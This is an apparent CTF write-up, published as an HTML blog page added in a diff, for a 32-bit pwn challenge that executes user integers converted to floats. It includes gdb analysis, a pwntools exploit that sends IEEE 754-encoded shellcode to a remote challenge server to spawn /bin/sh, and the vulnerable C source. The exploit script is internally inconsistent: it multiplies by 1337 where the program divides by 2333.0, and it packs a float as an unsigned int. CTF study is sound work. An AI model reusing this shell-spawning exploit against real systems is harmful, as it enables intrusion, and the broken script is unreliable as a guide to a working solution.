@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>loding (50分) - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=CTF" class="tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">#CTF</a>
+    <a href="../tags/list.html?tag=逆向" class="tag tag-purple">#逆向</a>
+    <a href="../tags/list.html?tag=Pwn" class="tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">#Pwn</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2026 // 05 / 31</div>
+  <div class="post-title">loding (50分)</div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">CTF</span>
+    <span class="post-tag" style="background:#7b2d8e22;color:#7b2d8e;border:1px solid #7b2d8e44">逆向</span>
+    <span class="post-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">Pwn</span>
+  </div>
+</div>
+
+<div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+<nav class="post-toc">
+  <span class="post-toc-title">// 目录</span>
+  <ul>
+    <li class="toc-h3"><a href="#ida">IDA 分析</a></li>
+    <li class="toc-h3"><a href="#mmap">mmap 背景</a></li>
+    <li class="toc-h3"><a href="#logic">程序逻辑</a></li>
+    <li class="toc-h3"><a href="#ieee754">IEEE 754 编码</a></li>
+    <li class="toc-h3"><a href="#exp">Exp 脚本</a></li>
+    <li class="toc-h3"><a href="#source">源码</a></li>
+  </ul>
+</nav>
+
+<h3 id="ida">IDA 分析</h3>
+
+<p>32 位程序，IDA 直接 F5：</p>
+
+<p><img src="../assets/ld_image002.png" alt="IDA 伪代码" style="max-width:100%"></p>
+
+<p>发现有一个我们无法直接控制的变量 v6，也就是 mmap 分配内存的起始位置。</p>
+
+<h3 id="mmap">mmap 背景</h3>
+
+<p>参考：</p>
+<ul>
+  <li><a href="https://zhuanlan.zhihu.com/p/477641987">Linux 内存映射函数 mmap 详解</a></li>
+  <li><a href="https://www.cnblogs.com/huxiao-tee/p/4660352.html">了解一下 mmap 是什么，为什么这么屌</a></li>
+</ul>
+
+<h3 id="logic">程序逻辑</h3>
+
+<p>关键看 for 循环：</p>
+
+<p><img src="../assets/ld_image004.png" alt="scanf 循环" style="max-width:100%"></p>
+
+<p><code>unk_80485F0</code> 指向的内存值为 <code>%d</code>，所以从键盘读入整数，以十进制形式，然后转换为浮点数再除以 <code>2333.0</code>，再写入 v6 指向的内存。</p>
+
+<p><img src="../assets/ld_image006.png" alt="scanf 代码" style="max-width:100%"></p>
+
+<p>开始调试，安装 gdb 插件：</p>
+<ul>
+  <li><a href="https://blog.csdn.net/whbing1471/article/details/112410599">gdb peda / pwngdb / pwndbg 安装使用</a></li>
+</ul>
+
+<p><img src="../assets/ld_image008.png" alt="gdb 调试" style="max-width:100%"></p>
+
+<p>一步一步来：</p>
+
+<p><img src="../assets/ld_image010.png" alt="gdb 下查看" style="max-width:100%"></p>
+
+<p><img src="../assets/ld_image012.png" alt="mmap 查看" style="max-width:100%"></p>
+
+<p>给 mmap 下断点：</p>
+
+<p><img src="../assets/ld_image014.png" alt="mmap 断点" style="max-width:100%"></p>
+
+<p>找到地址了：</p>
+
+<p><img src="../assets/ld_image016.png" alt="找到 mmap 地址" style="max-width:100%"></p>
+
+<h3 id="ieee754">IEEE 754 编码</h3>
+
+<p>注意看这里，这个代码是需要输入的，假如输入几个字符串看一下，在栈上直接显示的是我们需要输入的字符了。</p>
+
+<p>int 占 4 字节，我们需要 4 字节的 shellcode，4 字节的 nop 形式应该是 <code>nop shellcode shellcode nop</code>。</p>
+
+<p>参考：<a href="https://blog.csdn.net/weixin_47713503/article/details/108699001">IEEE 754 浮点数转换 + 计算 = 看得懂</a></p>
+
+<p>程序逻辑是：输入 int → <code>(float)int / 2333.0</code> 存入 → 当作代码执行。</p>
+
+<p>所以我们的 shellcode 需要满足：输入值 / 2333.0 的 float 表示，在内存中恰好等于我们想要的字节，即 <code>int * 1337</code> 的计算方式：</p>
+
+<h3 id="exp">Exp 脚本</h3>
+
+<pre><code>import struct
+import pwnlib
+import time
+from pwn import *
+
+def get_int(s):
+    a = struct.unpack('&lt;f', s)[0] * 1337
+    return struct.unpack('I', struct.pack('&lt;I', a))[0]
+
+target = remote('106.75.2.53', 10009)
+
+print "Sending IEEE754 shellcode..."
+time.sleep(1)
+
+for i in range(3):
+    target.sendline(str(get_int('\x00\x00\x00\x00')))
+
+target.sendline(str(get_int('\x99\x89\xc3\x47')))    # mov ebx, eax
+target.sendline(str(get_int('\x41\x44\x44\x44')))    # nop/align
+
+for c in '/bin/sh\x00':
+    target.sendline(str(get_int('\x99\xb0'+c+'\x47')))  # mov al, c
+    target.sendline(str(get_int('\x57\x89\x03\x43')))   # mov [ebx], eax; inc ebx
+
+for i in range(8):
+    target.sendline(str(get_int('\x57\x4b\x41\x47')))   # dec ebx
+
+target.sendline(str(get_int('\x99\x31\xc0\x47')))   # xor eax, eax
+target.sendline(str(get_int('\x99\x31\xc9\x47')))   # xor ecx, ecx
+target.sendline(str(get_int('\x99\x31\xd2\x47')))   # xor edx, edx
+target.sendline(str(get_int('\x99\xb0\x0b\x47')))   # mov al, 0xb
+target.sendline(str(get_int('\x99\xcd\x80\x47')))   # int 0x80
+
+target.sendline('c')
+target.interactive()</code></pre>
+
+<h3 id="source">源码</h3>
+
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char** argv) {
+    float* array = mmap(0, sizeof(float)*8192, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    int i;
+    int temp;
+    float ftemp;
+
+    for (i = 0; i &lt; 8192; i++) {
+        if (!scanf("%d", &amp;temp)) break;
+        array[i] = ((float)temp)/2333.0;
+    }
+
+    write(1, "here we go\n", 11);
+    (*(void(*)())array)();
+}</code></pre>
+
+</div>
+
+<div class="footer">
+  <div class="brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG</div>
+  <div class="motto">&gt; 保持好奇 · 保持怀疑 · 保持学习</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const html = document.documentElement;
+const themeBtn = document.getElementById('themeToggle');
+const saved = localStorage.getItem('theme') || 'dark';
+html.setAttribute('data-theme', saved);
+themeBtn.textContent = saved === 'dark' ? '☽' : '☀';
+themeBtn.addEventListener('click', () => {
+  const cur = html.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', next);
+  localStorage.setItem('theme', next);
+  themeBtn.textContent = next === 'dark' ? '☽' : '☀';
+});
+const topBtn = document.getElementById('backToTop');
+topBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+window.addEventListener('scroll', () => topBtn.classList.toggle('show', window.scrollY > 300), { passive: true });
+
+const navSentinel = document.getElementById('navSentinel');
+const navWrap = document.getElementById('navWrap');
+let navSpacer = null;
+const navObs = new IntersectionObserver(([e]) => {
+  const stuck = !e.isIntersecting;
+  navWrap.classList.toggle('fixed', stuck);
+  if (stuck && !navSpacer) {
+    navSpacer = document.createElement('div');
+    navSpacer.style.height = navWrap.offsetHeight + 'px';
+    navWrap.parentNode.insertBefore(navSpacer, navWrap.nextSibling);
+  } else if (!stuck && navSpacer) {
+    navSpacer.remove(); navSpacer = null;
+  }
+}, { threshold: [0] });
+navObs.observe(navSentinel);
+
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+</script>
+
+</body>
+</html>
